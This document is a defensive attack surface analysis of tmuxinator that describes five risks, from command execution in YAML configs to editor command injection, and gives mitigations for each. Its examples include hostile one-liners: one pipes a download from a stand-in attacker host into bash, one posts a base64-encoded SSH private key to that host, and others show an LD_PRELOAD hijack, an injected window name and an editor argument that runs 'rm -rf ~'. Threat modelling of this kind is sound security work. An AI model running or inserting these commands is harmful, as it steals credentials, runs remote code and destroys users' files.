# Attack Surface Analysis for tmuxinator/tmuxinator

## Attack Surface: [1. Arbitrary Command Execution via YAML Configuration](./attack_surfaces/1__arbitrary_command_execution_via_yaml_configuration.md)

*   **Description:**  Attackers can embed malicious shell commands within the `tmuxinator` YAML configuration files. These commands are executed directly by `tmuxinator` when the configuration is loaded. This is the most direct and dangerous attack vector.
*   **How Tmuxinator Contributes:** `tmuxinator`'s core functionality is to parse the YAML configuration and execute the commands specified in the `pre`, `pre_window`, `post`, `on_project_*`, window, and pane definitions.
*   **Example:**
    ```yaml
    pre: "curl http://attacker.com/malware | bash" # Downloads and executes a malicious script.
    windows:
      - editor:
          panes:
            - "echo 'malicious command' | bash" # Executes a command in a new pane.
    ```
*   **Impact:** Complete system compromise. The attacker can gain full control of the user's account and potentially the entire system, depending on the privileges of the user running `tmuxinator`.
*   **Risk Severity:** **Critical**
*   **Mitigation Strategies:**
    *   **(User)** *Never* run `tmuxinator` configurations from untrusted sources. *Always* meticulously inspect the YAML file before executing it. This is the *primary* defense.
    *   **(User)** Run `tmuxinator` with the least necessary privileges (avoid running as root).
    *   **(User)** Store configuration files in a secure location with appropriate file permissions to prevent unauthorized modification.
    *   **(Development)** Implement basic input validation to warn about *obviously* dangerous commands (e.g., `rm -rf /`). This is a *defense-in-depth* measure, not a complete solution.
    *   **(Development - Future)** Explore sandboxing (e.g., containerization) for command execution. This is a complex undertaking but would significantly improve security.
    *   **(Development - Future)** Consider configuration signing to allow `tmuxinator` to verify the integrity and authenticity of the YAML file.

## Attack Surface: [2. Environment Variable Manipulation](./attack_surfaces/2__environment_variable_manipulation.md)

*   **Description:** Attackers can leverage `tmuxinator`'s command execution capabilities (primarily through the `pre` hook) to set or modify environment variables. This can influence the behavior of subsequently executed commands within the `tmuxinator` configuration, or even affect other applications running on the system.
*   **How Tmuxinator Contributes:** The `pre` (and potentially other) configuration options allow arbitrary command execution, which can be used to manipulate environment variables.
*   **Example:**
    ```yaml
    pre: "export LD_PRELOAD=/path/to/malicious.so" # Forces a malicious library to be loaded by subsequent processes.
    ```
*   **Impact:** Can lead to privilege escalation, bypass security controls (if an application relies on environment variables for security decisions), or cause application instability.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **(User)** Same as for arbitrary command execution: *never* trust untrusted configurations, thoroughly inspect YAML files, run with least privilege, and secure configuration storage.
    *   **(Development)** Consider limiting the scope of environment variable modifications, although this is difficult to implement effectively without breaking legitimate use cases.
    *   **(Development)** Warn users about configurations that modify sensitive environment variables (e.g., `LD_PRELOAD`, `PATH`).

## Attack Surface: [3. Data Exfiltration](./attack_surfaces/3__data_exfiltration.md)

*   **Description:**  Attackers can use commands within the YAML configuration to transmit sensitive data from the user's system to an external server.
*   **How Tmuxinator Contributes:** `tmuxinator`'s command execution capabilities provide the mechanism for exfiltration. The attacker can craft commands to read sensitive data and send it over the network.
*   **Example:**
    ```yaml
    pre: "curl -X POST -d \"$(cat ~/.ssh/id_rsa | base64)\" http://attacker.com/exfil" # Sends a private SSH key to the attacker.
    ```
*   **Impact:**  Leakage of sensitive information, including environment variables, API keys, passwords (if stored insecurely), and file contents. This can lead to further compromise.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **(User)** Same as for arbitrary command execution: *never* trust untrusted configurations, meticulously inspect YAML files, run with least privilege, and secure configuration storage.
    *   **(User)** Avoid storing sensitive information in easily accessible locations (e.g., plain text files, environment variables). Use appropriate secure storage mechanisms.
    *   **(Development)** Warn users about configurations that use network communication commands (e.g., `curl`, `wget`, `nc`). This is a defense-in-depth measure.

## Attack Surface: [4. Tmux Command Injection](./attack_surfaces/4__tmux_command_injection.md)

*   **Description:** If `tmuxinator` constructs `tmux` commands insecurely (e.g., by directly concatenating user-provided strings into `tmux` commands without proper escaping), an attacker might be able to inject their own `tmux` commands. This is a vulnerability *within* `tmuxinator`'s code, not just a consequence of its features.
*   **How Tmuxinator Contributes:** `tmuxinator` generates and sends commands to the `tmux` server to create and manage sessions, windows, and panes. The vulnerability lies in *how* these commands are constructed.
*   **Example:** (Hypothetical - depends on a specific coding flaw in `tmuxinator`)
    ```yaml
    # If tmuxinator doesn't properly escape the window name:
    windows:
      - "'; echo 'Malicious command' | bash; #":  # Injected command.
          panes:
            - vim
    ```
*   **Impact:** Can lead to session hijacking (taking control of the user's `tmux` session), indirect command execution (by manipulating `tmux` to run commands), and bypassing of any intended restrictions imposed by `tmuxinator`.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **(Development)** *Use a dedicated `tmux` library* (if one is available for Ruby) that handles command construction and escaping securely. This is the *best* and most reliable solution.
    *   **(Development)** If a library is not used, implement *extremely rigorous* and *careful* escaping of *all* user-provided input that is included in `tmux` commands. This is error-prone and should be avoided if possible.  Use a well-tested escaping function, not ad-hoc string manipulation.
    *   **(Development)** Prefer parameterized `tmux` commands where possible (e.g., using separate arguments for window names, pane commands, etc.) to reduce the risk of injection.

## Attack Surface: [5. Editor Command Injection](./attack_surfaces/5__editor_command_injection.md)

*   **Description:**  Attackers can inject commands into the editor used to open configuration files, if `tmuxinator` doesn't properly sanitize the editor command or arguments.
*   **How Tmuxinator Contributes:** `tmuxinator` allows specifying the editor to use for opening configuration files via command-line arguments or environment variables.
*   **Example:**
    ```bash
    tmuxinator start malicious_project --editor="vim -c ':!bash -c \"rm -rf ~\"'"
    # Or through EDITOR environment variable
    EDITOR="vim -c ':!bash -c \"rm -rf ~\"'" tmuxinator start malicious_project
    ```
*   **Impact:**  Can lead to arbitrary command execution with the user's privileges, potentially leading to complete system compromise.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **(Development)** Validate the editor path to prevent using malicious executables.  Only allow editors from a whitelist of known-safe locations (e.g., `/usr/bin/vim`, `/usr/bin/nano`).
    *   **(Development)** Use a safe default editor (e.g., `nano`).
    *   **(Development)** Sanitize or restrict command-line arguments passed to the editor.  Avoid passing arbitrary user-provided strings as arguments to the editor.  If arguments must be passed, use a well-defined and restricted set of options.
